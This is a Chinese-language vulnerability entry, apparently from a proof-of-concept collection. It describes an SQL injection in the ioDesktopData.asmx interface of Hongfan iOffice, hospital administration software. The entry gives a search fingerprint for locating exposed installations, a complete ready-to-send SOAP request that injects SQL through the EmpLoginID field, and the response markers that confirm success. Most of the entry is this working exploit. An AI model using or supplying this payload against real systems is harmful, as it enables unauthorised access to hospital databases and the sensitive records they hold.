﻿# 红帆iOffice ioDesktopData.asmx接口存在SQL注入漏洞

> 更新时间：2024-03-08

> 漏洞编号：

> 漏洞说明：红帆iOffice.net从最早满足医院行政办公需求（传统OA），到目前融合了卫生主管部门的管理规范和众多行业特色应用，是目前唯一定位于解决医院综合业务管理的软件，是最符合医院行业特点的医院综合业务管理平台，是成功案例最多的医院综合业务管理软件。红帆iOffice ioDesktopData.asmx接口存在SQL注入漏洞。

> 漏洞特征：app="红帆-ioffice" || app="红帆-HFOffice"

> 验证脚本：HTTP

```
POST /iOffice/prg/set/wss/ioDesktopData.asmx HTTP/1.1
Content-Type: text/xml;charset=UTF-8
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Connection: close

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tem="http://tempuri.org/">
<soap:Header/>
<soap:Body>
<tem:GetDepSchedule>
<!--type: string-->
<tem:EmpLoginID>1'+(SELECT CHAR(103)+CHAR(105)+CHAR(75)+CHAR(83) WHERE 6621=6621 AND 7795 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(106)+CHAR(122)+CHAR(113)+(select sys.fn_varbintohexstr(hashbytes('md5','123')))+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(120)+CHAR(113))))+'</tem:EmpLoginID>
</tem:GetDepSchedule>
</soap:Body>
</soap:Envelope>
```

> 响应代码特征：200

> 响应内容特征：ac59075b964b0715

> 上传文件定位：

> 验证文件来源：红帆iOffice ioDesktopData.asmx接口存在SQL注入漏洞.poc

